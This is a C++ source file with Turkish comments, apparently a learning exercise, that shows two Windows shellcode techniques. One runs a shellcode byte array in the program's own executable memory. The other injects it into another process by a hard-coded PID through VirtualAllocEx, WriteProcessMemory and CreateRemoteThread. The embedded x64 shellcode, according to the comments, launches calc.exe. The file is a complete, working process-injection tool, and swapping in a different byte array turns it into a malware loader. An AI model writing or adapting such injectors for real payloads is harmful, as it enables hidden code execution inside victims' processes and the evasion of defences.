#include <iostream>
#include <windows.h> //win32 api kütüphanesi
#include <TlHelp32.h> //windowsta çalışan process ve thread'leri listelemek için kullanılır. birazdan snapshot alacağım.
#include <clocale> 

using namespace std;


void ShCodeRunner();
void RemoteShellCodeInjector();

int main()
{
  setlocale(LC_ALL, "Turkish"); //konsolu türkçe karakterlere uygun hale getirir. debug aşaması için faydalı.

  RemoteShellCodeInjector();
}

void ShCodeRunner()
{
	// 1. İşlemcinin doğrudan çalıştıracağı ham makine kodları (Shellcode)
	// (0x90 = NOP yani boş geç, 0xC3 = RET yani fonksiyonu bitir dön)
	unsigned char shellcode[] = {
		0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63,
		0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B,
		0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10, 0x48, 0xAD, 0x48,
		0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17,
		0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24,
		0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57,
		0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C, 0x48, 0x01, 0xFE,
		0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4,
		0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3
	};

	// 2. Kendi RAM'imizde alan tahsis ediyoruz
	LPVOID calismaAlani = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (calismaAlani != NULL)
	{
		cout << "Bellekte çalışma alan kiralandı. Adres: " << calismaAlani << endl;

		// 3. Baytları kiraladığımız alana kopyalıyoruz
		memcpy(calismaAlani, shellcode, sizeof(shellcode));
		cout << "2. Adim: Shellcode alana kopyalandı." << endl;

		// 4. İşlemciye: "Bu adresteki kodları çalıştır" diyoruz (Yeni bir Thread açarak)
		HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)calismaAlani, NULL, 0, NULL);

		if (hThread != NULL)
		{
			cout << "3. Adim: Shellcode çalıştırıldı." << endl;
			WaitForSingleObject(hThread, INFINITE); // Thread bitene kadar bekle
			CloseHandle(hThread);
		}
		else
		{
			cout << "HATA: Thread olusturulamadi. Hata Kodu: " << GetLastError() << endl;
		}
	}


}

void RemoteShellCodeInjector()
{
	// 1. Az önce çalışan x64 calc.exe Shellcode baytlarımız
	unsigned char shellcode[] = {
		0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63,
		0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B,
		0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10, 0x48, 0xAD, 0x48,
		0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17,
		0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24,
		0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57,
		0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C, 0x48, 0x01, 0xFE,
		0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4,
		0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3
	};

	DWORD targetPID = 24276; // Hedef process id'sini buraya yazıyoruz

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
	if (hProcess == NULL)
	{
		cout << "HATA: Process bulunamadi. Hata Kodu: " << GetLastError() << endl;
		return;
	}
	cout << "1. Adım Hedef Sürece Bağlanıldı" << endl;

	// 2. Adım: Hedef surecin icinde calistirilabilir alan kirala
	LPVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (remoteBuffer == NULL)
	{
		cout << "Hedefte Alan Kiralanamadı. Hata Kodu: " << GetLastError() << endl;
		CloseHandle(hProcess);
		return;
	}
	cout << "2. Adım: Hedefte Alan Kiralandı. Adres: " << remoteBuffer << endl;

	// 3. Adım: Shellcode baytlarini hedef surecin bellegine yaz
	BOOL writeResult = WriteProcessMemory(hProcess, remoteBuffer, shellcode, sizeof(shellcode), NULL);
	if (!writeResult)
	{
		cout << "HATA: Hedefe Yazılamadı. Hata Kodu: " << GetLastError() << endl;
		CloseHandle(hProcess);
		return;
	}
	cout << "3. Adım: Shellcode Hedefe Yazıldı." << endl;

	// 4. Adım: Hedef surec icinde thread baslatip adresi calistir
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	if (hThread != NULL)
	{
		cout << "4. Adım: Hedefte Thread Tetiklendi. Kod Kurban Süreç İçinde Çalışıyor" << endl;
		WaitForSingleObject(hThread, INFINITE);
		CloseHandle(hThread);
	}
	else
	{
		cout << "HATA: Hedefte Thread Başlatılamadı. Hata Kodu: " << GetLastError() << endl;
	}

	CloseHandle(hProcess);
}
